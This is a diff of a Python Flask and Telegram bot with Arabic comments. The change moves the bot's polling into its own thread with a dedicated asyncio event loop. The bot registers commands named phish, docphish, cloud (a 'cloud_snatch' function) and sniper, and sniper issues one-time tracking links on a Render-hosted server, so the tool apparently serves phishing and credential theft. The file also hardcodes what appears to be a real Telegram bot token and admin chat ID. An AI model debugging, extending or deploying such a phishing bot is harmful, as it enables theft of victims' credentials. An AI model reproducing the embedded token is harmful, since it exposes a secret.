@@ -1,4 +1,4 @@
-import os, re, uuid, logging, tempfile
+import os, re, uuid, logging, tempfile, asyncio
 import requests
 from bs4 import BeautifulSoup
 from flask import Flask, request, send_from_directory, abort, redirect
@@ -9,8 +9,8 @@ from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 
 # ========== القيم المدمجة ==========
 BOT_TOKEN = "8511885419:AAHi0yNNaA1IVDtulFZBokSb9l_KbXaQe38"
-ADMIN_CHAT = "6829017835"  # معرف دردشتك الرقمي
-RENDER_URL = "https://goldengeneral.onrender.com"  # رابط Render العام (بدون / في النهاية)
+ADMIN_CHAT = "6829017835"
+RENDER_URL = "https://goldengeneral.onrender.com"
 # ====================================
 
 TELEGRAM_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
@@ -239,8 +239,10 @@ async def sniper(update: Update, context: ContextTypes.DEFAULT_TYPE):
     one_time_links[link_id] = (target, False)
     await update.message.reply_text(f"رابط القناص: {RENDER_URL}/sniper/{link_id}")
 
-def main():
-    # تشغيل البوت في Thread
+def start_bot():
+    """تشغيل البوت في خيط مع حلقة أحداث خاصة"""
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
     telegram_app = ApplicationBuilder().token(BOT_TOKEN).build()
     telegram_app.add_handler(CommandHandler("start", start))
     telegram_app.add_handler(CommandHandler("phish", phish))
@@ -253,9 +255,13 @@ def main():
     telegram_app.add_handler(CommandHandler("docphish", docphish))
     telegram_app.add_handler(CommandHandler("cloud", cloud_snatch))
     telegram_app.add_handler(CommandHandler("sniper", sniper))
-    Thread(target=telegram_app.run_polling, daemon=True).start()
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host='0.0.0.0', port=port)
+    # استخدام run_polling مع إغلاق الحلقة عند الخروج
+    telegram_app.run_polling(close_loop=False)
+    loop.close()
 
 if __name__ == '__main__':
-    main()
+    # تشغيل البوت في خيط منفصل
+    bot_thread = Thread(target=start_bot, daemon=True)
+    bot_thread.start()
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host='0.0.0.0', port=port)
